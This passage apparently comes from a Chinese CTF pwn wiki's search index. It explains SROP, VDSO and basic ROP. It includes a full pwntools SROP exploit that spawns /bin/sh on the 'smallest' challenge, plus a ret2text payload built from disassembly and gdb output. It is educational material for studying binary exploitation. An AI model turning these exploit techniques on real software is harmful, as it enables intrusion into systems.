\u503c\u5f97\u4e00\u8bf4\u7684\u662f\uff0c\u5bf9\u4e8esigreturn\u7cfb\u7edf\u8c03\u7528\u6765\u8bf4\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e2d\uff0csigreturn\u7cfb\u7edf\u8c03\u7528\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\uff0c\u53ea\u9700\u8981RAX=15\uff0c\u5e76\u4e14\u6267\u884csyscall\u5373\u53ef\u5b9e\u73b0\u8c03\u7528syscall\u8c03\u7528\u3002\u800cRAX\u5bc4\u5b58\u5668\u7684\u503c\u53c8\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6765\u95f4\u63a5\u63a7\u5236\uff0c\u6bd4\u5982\u8bf4read\u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002","title":"\u540e\u7eed"},{"location":"pwn/stackoverflow/advanced_rop/#_10","text":"\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u76ee\u524d\u7684pwntools\u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86\u5bf9\u4e8esrop\u7684\u653b\u51fb\u3002","title":"\u5229\u7528\u5de5\u5177"},{"location":"pwn/stackoverflow/advanced_rop/#_11","text":"\u8fd9\u91cc\u4ee5360\u6625\u79cb\u676f\u4e2d\u7684smallest-pwn\u4e3a\u4f8b\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b \u786e\u5b9a\u6587\u4ef6\u57fa\u672c\u4fe1\u606f \u279c smallest file smallest smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \u53ef\u4ee5\u770b\u5230\u8be5\u7a0b\u5e8f\u4e3a64\u4f4d\u9759\u6001\u94fe\u63a5\u7248\u672c\u3002 \u68c0\u67e5\u4fdd\u62a4 \u279c smallest checksec smallest Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002 \u6f0f\u6d1e\u53d1\u73b0 \u5b9e\u7528IDA\u76f4\u63a5\u53cd\u7f16\u8bd1\u770b\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u7a0b\u5e8f\u5c31\u51e0\u884c\u6c47\u7f16\u4ee3\u7801\uff0c\u5982\u4e0b public start start proc near xor rax , rax mov edx , 400 h mov rsi , rsp mov rdi , rax syscall retn start endp \u6839\u636esyscall\u7684\u7f16\u53f7\u4e3a0\uff0c\u53ef\u4ee5\u77e5\u9053\u8be5\u7a0b\u5e8f\u6267\u884c\u7684\u6307\u4ee4\u4e3aread(0,$rsp,400)\uff0c\u5373\u5411\u6808\u9876\u8bfb\u5165400\u4e2a\u5b57\u7b26\u3002\u6beb\u65e0\u7591\u95ee\uff0c\u8fd9\u4e2a\u662f\u6709\u6808\u6ea2\u51fa\u7684\u3002 \u5229\u7528\u601d\u8def \u7531\u4e8e\u7a0b\u5e8f\u4e2d\u5e76\u6ca1\u6709sigreturn\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u81ea\u5df1\u6784\u9020\uff0c\u6b63\u597d\u8fd9\u91cc\u6709read\u51fd\u6570\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7read\u51fd\u6570\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u6765\u8bbe\u7f6erax\u7684\u503c\u3002\u91cd\u8981\u601d\u8def\u5982\u4e0b \u901a\u8fc7\u63a7\u5236read\u8bfb\u53d6\u7684\u5b57\u7b26\u6570\u6765\u8bbe\u7f6eRAX\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4ece\u800c\u6267\u884csigreturn \u901a\u8fc7syscall\u6267\u884cexecve(\"/bin/sh\",0,0)\u6765\u83b7\u53d6shell\u3002 \u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f from pwn import * from LibcSearcher import * small = ELF ( './smallest' ) if args [ 'REMOTE' ]: sh = remote ( '127.0.0.1' , 7777 ) else : sh = process ( './smallest' ) context . arch = 'amd64' context . log_level = 'debug' syscall_ret = 0x00000000004000BE start_addr = 0x00000000004000B0 ## set start addr three times payload = p64 ( start_addr ) * 3 sh . send ( payload ) ## modify the return addr to start_addr+3 ## so that skip the xor rax,rax; then the rax=1 ## get stack addr sh . send ( ' \\xb3 ' ) stack_addr = u64 ( sh . recv ()[ 8 : 16 ]) log . success ( 'leak stack addr :' + hex ( stack_addr )) ## make the rsp point to stack_addr ## the frame is read(0,stack_addr,0x400) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_read sigframe . rdi = 0 sigframe . rsi = stack_addr sigframe . rdx = 0x400 sigframe . rsp = stack_addr sigframe . rip = syscall_ret payload = p64 ( start_addr ) + 'a' * 8 + str ( sigframe ) sh . send ( payload ) ## set rax=15 and call sigreturn sigreturn = p64 ( syscall_ret ) + 'b' * 7 sh . send ( sigreturn ) ## call execv(\"/bin/sh\",0,0) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_execve sigframe . rdi = stack_addr + 0x120 # \"/bin/sh\" 's addr sigframe . rsi = 0x0 sigframe . rdx = 0x0 sigframe . rsp = stack_addr sigframe . rip = syscall_ret frame_payload = p64 ( start_addr ) + 'b' * 8 + str ( sigframe ) print len ( frame_payload ) payload = frame_payload + ( 0x120 - len ( frame_payload )) * ' \\x00 ' + '/bin/sh \\x00 ' sh . send ( payload ) sh . send ( sigreturn ) sh . interactive () \u5176\u57fa\u672c\u6d41\u7a0b\u4e3a \u8bfb\u53d6\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740 \u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5229\u7528\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8bfb\u53d6\u5730\u5740\uff0c\u4fee\u6539\u8fd4\u56de\u5730\u5740(\u5373\u7b2c\u4e8c\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740)\u4e3a\u6e90\u7a0b\u5e8f\u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u5e76\u4e14\u4f1a\u8bbe\u7f6erax=1 \u90a3\u4e48\u6b64\u65f6\u5c06\u4f1a\u6267\u884cwrite(1,$esp,0x400)\uff0c\u6cc4\u9732\u6808\u5730\u5740\u3002 \u5229\u7528\u7b2c\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8fdb\u800c\u8bfb\u5165payload \u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u8fdb\u800c\u5c06\u5411\u6808\u5730\u5740\u6240\u5728\u4f4d\u7f6e\u8bfb\u5165\u6570\u636e\uff0c\u6784\u9020execve('/bin/sh',0,0) \u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002","title":"\u793a\u4f8b"},{"location":"pwn/stackoverflow/advanced_rop/#_12","text":"Defcon 2015 Qualifier: fuckup \u53c2\u8003\u9605\u8bfb Sigreturn Oriented Programming (SROP) Attack\u653b\u51fb\u539f\u7406 SROP by Angle Baby \u7cfb\u7edf\u8c03\u7528","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/advanced_rop/#ret2vdso","text":"","title":"ret2VDSO"},{"location":"pwn/stackoverflow/advanced_rop/#vdso","text":"\u4ec0\u4e48\u662fVDSO(Virtual Dynamically-linked Shared Object)\u5462\uff1f\u542c\u5176\u540d\u5b57\uff0c\u5927\u6982\u662f\u865a\u62df\u52a8\u6001\u94fe\u63a5\u5171\u4eab\u5bf9\u8c61\uff0c\u6240\u4ee5\u8bf4\u5b83\u5e94\u8be5\u662f\u865a\u62df\u7684\uff0c\u4e0e\u865a\u62df\u5185\u5b58\u4e00\u76f4\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\u672c\u8eab\u5e76\u4e0d\u5b58\u5728\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u662f\u5c06\u5185\u6838\u6001\u7684\u8c03\u7528\u6620\u5c04\u5230\u7528\u6237\u5730\u5740\u7a7a\u95f4\u7684\u5e93\u3002\u90a3\u4e48\u5b83\u4e3a\u4ec0\u4e48\u4f1a\u5b58\u5728\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6709\u4e9b\u7cfb\u7edf\u8c03\u7528\u7ecf\u5e38\u88ab\u7528\u6237\u4f7f\u7528\uff0c\u8fd9\u5c31\u4f1a\u51fa\u73b0\u5927\u91cf\u7684\u7528\u6237\u6001\u4e0e\u5185\u6838\u6001\u5207\u6362\u7684\u5f00\u9500\u3002\u901a\u8fc7vdso\uff0c\u6211\u4eec\u53ef\u4ee5\u5927\u91cf\u51cf\u5c11\u8fd9\u6837\u7684\u5f00\u9500\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u7684\u8def\u5f84\u66f4\u597d\u3002\u8fd9\u91cc\u8def\u5f84\u66f4\u597d\u6307\u7684\u662f\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u4f7f\u7528\u4f20\u7edf\u7684int 0x80\u6765\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4e0d\u540c\u7684\u5904\u7406\u5668\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4 intel\u5b9e\u73b0\u4e86sysenter\uff0csysexit amd\u5b9e\u73b0\u4e86syscall\uff0csysret \u5f53\u4e0d\u540c\u7684\u5904\u7406\u5668\u67b6\u6784\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u6307\u4ee4\u65f6\uff0c\u81ea\u7136\u5c31\u4f1a\u51fa\u73b0\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u6240\u4ee5linux\u5b9e\u73b0\u4e86vsyscall\u63a5\u53e3\uff0c\u5728\u5e95\u5c42\u4f1a\u6839\u636e\u5177\u4f53\u7684\u7ed3\u6784\u6765\u8fdb\u884c\u5177\u4f53\u64cd\u4f5c\u3002\u800cvsyscall\u5c31\u5b9e\u73b0\u5728vdso\u4e2d\u3002 \u8fd9\u91cc\uff0c\u6211\u4eec\u987a\u4fbf\u6765\u770b\u4e00\u4e0bvdso\uff0c\u5728Linux(kernel 2.6 or upper)\u4e2d\u6267\u884cldd /bin/sh, \u4f1a\u53d1\u73b0\u6709\u4e2a\u540d\u5b57\u53eblinux-vdso.so.1(\u8001\u70b9\u7684\u7248\u672c\u662flinux-gate.so.1)\u7684\u52a8\u6001\u6587\u4ef6, \u800c\u7cfb\u7edf\u4e2d\u5374\u627e\u4e0d\u5230\u5b83, \u5b83\u5c31\u662fVDSO\u3002 \u4f8b\u5982: \u279c ~ ldd /bin/sh linux-vdso.so.1 = > ( 0x00007ffd8ebf2000 ) libc.so.6 = > /lib/x86_64-linux-gnu/libc.so.6 ( 0x00007f84ff2f9000 ) /lib64/ld-linux-x86-64.so.2 ( 0x0000560cae6eb000 ) \u9664\u4e86\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\uff0cglibc\u4e5f\u63d0\u4f9b\u4e86VDSO\u7684\u652f\u6301, open(), read(), write(), gettimeofday()\u90fd\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528VDSO\u4e2d\u7684\u5b9e\u73b0\u3002\u4f7f\u5f97\u8fd9\u4e9b\u8c03\u7528\u901f\u5ea6\u66f4\u5feb\u3002 \u5185\u6838\u65b0\u7279\u6027\u5728\u4e0d\u5f71\u54cdglibc\u7684\u60c5\u51b5\u4e0b\u4e5f\u53ef\u4ee5\u66f4\u5feb\u7684\u90e8\u7f72\u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5intel\u7684\u5904\u7406\u5668\u4e3a\u4f8b\uff0c\u8fdb\u884c\u7b80\u5355\u8bf4\u660e\u3002 \u5176\u4e2dsysenter\u7684\u53c2\u6570\u4f20\u9012\u65b9\u5f0f\u4e0eint 0x80\u4e00\u81f4\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u5e03\u7f6e\u597d function prolog\uff0832\u4f4d\u4e3a\u4f8b\uff09 push ebp mov ebp , esp \u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u6ca1\u6709\u63d0\u4f9bfuncttion prolog\u7684\u8bdd\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u53ef\u4ee5\u8fdb\u884c\u6808\u8fc1\u79fb\u7684gadgets\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6539\u53d8\u6808\u7684\u4f4d\u7f6e\u3002","title":"VDSO\u4ecb\u7ecd"},{"location":"pwn/stackoverflow/advanced_rop/#_13","text":"\u5f85\u8865\u5145\u3002","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/advanced_rop/#_14","text":"Defcon 2015 Qualifier fuckup \u53c2\u8003 http://man7.org/linux/man-pages/man7/vdso.7.html http://adam8157.info/blog/2011/10/linux-vdso/","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/advanced_rop/#jop","text":"Jump-oriented programming","title":"JOP"},{"location":"pwn/stackoverflow/advanced_rop/#cop","text":"Call-oriented programming","title":"COP"},{"location":"pwn/stackoverflow/basic_rop/","text":"\u57fa\u672c ROP \u00b6 \u968f\u7740 NX \u4fdd\u62a4\u7684\u5f00\u542f\uff0c\u4ee5\u5f80\u76f4\u63a5\u5411\u6808\u6216\u8005\u5806\u4e0a\u76f4\u63a5\u6ce8\u5165\u4ee3\u7801\u7684\u65b9\u5f0f\u96be\u4ee5\u7ee7\u7eed\u53d1\u6325\u6548\u679c\u3002\u653b\u51fb\u8005\u4eec\u4e5f\u63d0\u51fa\u6765\u76f8\u5e94\u7684\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4fdd\u62a4\uff0c\u76ee\u524d\u4e3b\u8981\u7684\u662f ROP(Return Oriented Programming)\uff0c\u5176\u4e3b\u8981\u601d\u60f3\u662f\u5728 \u6808\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a\uff0c\u5229\u7528\u7a0b\u5e8f\u4e2d\u5df2\u6709\u7684\u5c0f\u7247\u6bb5( gadgets )\u6765\u6539\u53d8\u67d0\u4e9b\u5bc4\u5b58\u5668\u6216\u8005\u53d8\u91cf\u7684\u503c\uff0c\u4ece\u800c\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u6240\u8c13gadgets \u5c31\u662f\u4ee5 ret \u7ed3\u5c3e\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u65b9\u4fbf\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u4e4b\u6240\u4ee5\u79f0\u4e4b\u4e3a ROP\uff0c\u662f\u56e0\u4e3a\u6838\u5fc3\u5728\u4e8e\u5229\u7528\u4e86\u6307\u4ee4\u96c6\u4e2d\u7684 ret \u6307\u4ee4\uff0c\u6539\u53d8\u4e86\u6307\u4ee4\u6d41\u7684\u6267\u884c\u987a\u5e8f\u3002ROP \u653b\u51fb\u4e00\u822c\u5f97\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6 \u7a0b\u5e8f\u5b58\u5728\u6ea2\u51fa\uff0c\u5e76\u4e14\u53ef\u4ee5\u63a7\u5236\u8fd4\u56de\u5730\u5740\u3002 \u53ef\u4ee5\u627e\u5230\u6ee1\u8db3\u6761\u4ef6\u7684 gadgets \u4ee5\u53ca\u76f8\u5e94 gadgets \u7684\u5730\u5740\u3002 \u5982\u679c gadgets \u6bcf\u6b21\u7684\u5730\u5740\u662f\u4e0d\u56fa\u5b9a\u7684\uff0c\u90a3\u6211\u4eec\u5c31\u9700\u8981\u60f3\u529e\u6cd5\u52a8\u6001\u83b7\u53d6\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002 ret2text \u00b6 \u539f\u7406 \u00b6 ret2text \u5373\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7a0b\u5e8f\u672c\u8eab\u5df2\u6709\u7684\u7684\u4ee3\u7801(.text)\u3002\u5176\u5b9e\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u6cd5\u662f\u4e00\u79cd\u7b3c\u7edf\u7684\u63cf\u8ff0\u3002\u6211\u4eec\u63a7\u5236\u6267\u884c\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u597d\u51e0\u6bb5\u4e0d\u76f8\u90bb\u7684\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801(\u4e5f\u5c31\u662f gadgets)\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u6240\u8981\u8bf4\u7684ROP\u3002 \u8fd9\u65f6\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u5bf9\u5e94\u8fd4\u56de\u7684\u4ee3\u7801\u7684\u4f4d\u7f6e\u3002\u5f53\u7136\u7a0b\u5e8f\u4e5f\u53ef\u80fd\u4f1a\u5f00\u542f\u67d0\u4e9b\u4fdd\u62a4\uff0c\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u53bb\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\u3002 \u4f8b\u5b50 \u00b6 \u5176\u5b9e\uff0c\u5728\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u539f\u7406\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u8fd9\u4e00\u7b80\u5355\u7684\u653b\u51fb\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\uff0cbamboofox \u4e2d\u4ecb\u7ecd ROP \u65f6\u4f7f\u7528\u7684 ret2text \u7684\u4f8b\u5b50\u3002 \u70b9\u51fb\u4e0b\u8f7d: ret2text \u9996\u5148\uff0c\u67e5\u770b\u4e00\u4e0b\u7a0b\u5e8f\u7684\u4fdd\u62a4\u673a\u5236 \u279c ret2text checksec ret2text Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u662f 32 \u4f4d\u7a0b\u5e8f\uff0c\u5176\u4ec5\u4ec5\u5f00\u542f\u4e86\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u7136\u540e\uff0c\u6211\u4eec\u4f7f\u7528 IDA \u6765\u67e5\u770b\u6e90\u4ee3\u7801\u3002 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( _bss_start , 0 , 1 , 0 ); puts ( \"There is something amazing here, do you know anything?\" ); gets (( char * ) & v4 ); printf ( \"Maybe I will tell you next time !\" ); return 0 ; } \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5728\u4e3b\u51fd\u6570\u4e2d\u4f7f\u7528\u4e86 gets \u51fd\u6570\uff0c\u663e\u7136\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u6b64\u540e\u53c8\u53d1\u73b0 .text: 080485 FD secure proc near .text: 080485 FD .text: 080485 FD input = dword ptr - 10 h .text: 080485 FD secretcode = dword ptr - 0 Ch .text: 080485 FD .text: 080485 FD push ebp .text: 080485 FE mov ebp , esp .text: 08048600 sub esp , 28 h .text: 08048603 mov dword ptr [ esp ], 0 ; timer .text : 0804860 A call _time .text: 0804860 F mov [ esp ], eax ; seed .text : 08048612 call _srand .text: 08048617 call _rand .text: 0804861 C mov [ ebp + secretcode ], eax .text: 0804861 F lea eax , [ ebp + input ] .text: 08048622 mov [ esp + 4 ], eax .text: 08048626 mov dword ptr [ esp ], offset unk_8048760 .text: 0804862 D call ___isoc99_scanf .text: 08048632 mov eax , [ ebp + input ] .text: 08048635 cmp eax , [ ebp + secretcode ] .text: 08048638 jnz short locret_8048646 .text: 0804863 A mov dword ptr [ esp ], offset command ; \"/bin/sh\" .text : 08048641 call _system \u5728 secure \u51fd\u6570\u53c8\u53d1\u73b0\u4e86\u5b58\u5728\u8c03\u7528 system(\"/bin/sh\") \u7684\u4ee3\u7801\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u81f3 0x0804863A\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u7cfb\u7edf\u7684 shell \u4e86\u3002 \u4e0b\u9762\u5c31\u662f\u6211\u4eec\u5982\u4f55\u6784\u9020 payload \u4e86\uff0c\u9996\u5148\u9700\u8981\u786e\u5b9a\u7684\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u5185\u5b58\u7684\u8d77\u59cb\u5730\u5740\u8ddd\u79bb main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5b57\u8282\u6570\u3002 .text: 080486 A7 lea eax , [ esp + 1 Ch ] .text: 080486 AB mov [ esp ], eax ; s .text : 080486 AE call _gets \u53ef\u4ee5\u770b\u5230\u8be5\u5b57\u7b26\u4e32\u662f\u901a\u8fc7\u76f8\u5bf9\u4e8e esp \u7684\u7d22\u5f15\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u5c06\u65ad\u70b9\u4e0b\u5728 call \u5904\uff0c\u67e5\u770b esp\uff0cebp\uff0c\u5982\u4e0b gef\u27a4 b *0x080486AE Breakpoint 1 at 0x80486ae: file ret2text.c, line 24 . gef\u27a4 r There is something amazing here, do you know anything? Breakpoint 1 , 0x080486ae in main () at ret2text.c:24 24 gets ( buf ) ; \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ registers ] \u2500\u2500\u2500\u2500 $eax : 0xffffcd5c \u2192 0x08048329 \u2192 \"__libc_start_main\" $ebx : 0x00000000 $ecx : 0xffffffff $edx : 0xf7faf870 \u2192 0x00000000 $esp : 0xffffcd40 \u2192 0xffffcd5c \u2192 0x08048329 \u2192 \"__libc_start_main\" $ebp : 0xffffcdc8 \u2192 0x00000000 $esi : 0xf7fae000 \u2192 0x001b1db0 $edi : 0xf7fae000 \u2192 0x001b1db0 $eip : 0x080486ae \u2192 <main+102> call 0x8048460 <gets@plt> \u53ef\u4ee5\u770b\u5230 esp \u4e3a 0xffffcd40\uff0cebp \u4e3a\u5177\u4f53\u7684 payload \u5982\u4e0b 0xffffcdc8\uff0c\u540c\u65f6 s \u76f8\u5bf9\u4e8e esp \u7684\u7d22\u5f15\u4e3a [esp+0x1c]\uff0c\u6240\u4ee5\uff0cs \u7684\u5730\u5740\u4e3a 0xffffcd5c\uff0c\u6240\u4ee5 s \u76f8\u5bf9\u4e8e ebp \u7684\u504f\u79fb\u4e3a 0x6C\uff0c\u6240\u4ee5\u76f8\u5bf9\u4e8e\u8fd4\u56de\u5730\u5740\u7684\u504f\u79fb\u4e3a 0x6c+4\u3002 \u6700\u540e\u7684 payload \u5982\u4e0b\uff1a ##!/usr/bin/env python from pwn import * sh = process ( './ret2text' ) target = 0x804863a sh . sendline ( 'A' * ( 0x6c + 4 ) + p32 ( target )) sh . interactive () ret2shellcode \u00b6 \u539f\u7406 \u00b6 ret2shellcode\uff0c\u5373\u63a7\u5236\u7a0b\u5e8f\u6267\u884c shellcode\u4ee3\u7801\u3002shellcode \u6307\u7684\u662f\u7528\u4e8e\u5b8c\u6210\u67d0\u4e2a\u529f\u80fd\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u5e38\u89c1\u7684\u529f\u80fd\u4e3b\u8981\u662f\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u7684 shell\u3002 \u4e00\u822c\u6765\u8bf4\uff0cshellcode \u9700\u8981\u6211\u4eec\u81ea\u5df1\u586b\u5145\u3002\u8fd9\u5176\u5b9e\u662f\u53e6\u5916\u4e00\u79cd\u5178\u578b\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u9700\u8981\u81ea\u5df1\u53bb\u586b\u5145\u4e00\u4e9b\u53ef\u6267\u884c\u7684\u4ee3\u7801 \u3002 \u5728\u6808\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a\uff0c\u8981\u60f3\u6267\u884c shellcode\uff0c\u9700\u8981\u5bf9\u5e94\u7684 binary \u5728\u8fd0\u884c\u65f6\uff0cshellcode \u6240\u5728\u7684\u533a\u57df\u5177\u6709\u53ef\u6267\u884c\u6743\u9650\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 bamboofox \u4e2d\u7684 ret2shellcode \u4e3a\u4f8b \u70b9\u51fb\u4e0b\u8f7d: ret2shellcode \u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4 \u279c ret2shellcode checksec ret2shellcode Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE ( 0x8048000 ) RWX: Has RWX segments \u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u51e0\u4e4e\u6ca1\u6709\u5f00\u542f\u4efb\u4f55\u4fdd\u62a4\uff0c\u5e76\u4e14\u6709\u53ef\u8bfb\uff0c\u53ef\u5199\uff0c\u53ef\u6267\u884c\u6bb5\u3002\u6211\u4eec\u518d\u4f7f\u7528 IDA \u770b\u4e00\u4e0b\u7a0b\u5e8f int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"No system for you this time !!!\" ); gets (( char * ) & v4 ); strncpy ( buf2 , ( const char * ) & v4 , 0x64u ); printf ( \"bye bye ~\" ); return 0 ; } \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ecd\u7136\u662f\u57fa\u672c\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fd8\u540c\u65f6\u5c06\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u590d\u5236\u5230 buf2 \u5904\u3002\u7b80\u5355\u67e5\u770b\u53ef\u77e5 buf2 \u5728 bss \u6bb5\u3002 .bss: 0804 A080 public buf2 .bss: 0804 A080 ; char buf2[100] \u8fd9\u65f6\uff0c\u6211\u4eec\u7b80\u5355\u7684\u8c03\u8bd5\u4e0b\u7a0b\u5e8f\uff0c\u770b\u770b\u8fd9\u4e00\u4e2a bss \u6bb5\u662f\u5426\u53ef\u6267\u884c\u3002 gef\u27a4 b main Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8 . gef\u27a4 r Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1 , main () at ret2shellcode.c:8 8 setvbuf ( stdout, 0LL, 2 , 0LL ) ; \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ source:ret2shellcode.c+8 ] \u2500\u2500\u2500\u2500 6 int main ( void ) 7 { \u2192 8 setvbuf ( stdout, 0LL, 2 , 0LL ) ; 9 setvbuf ( stdin, 0LL, 1 , 0LL ) ; 10 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x8048536 \u2192 Name: main() 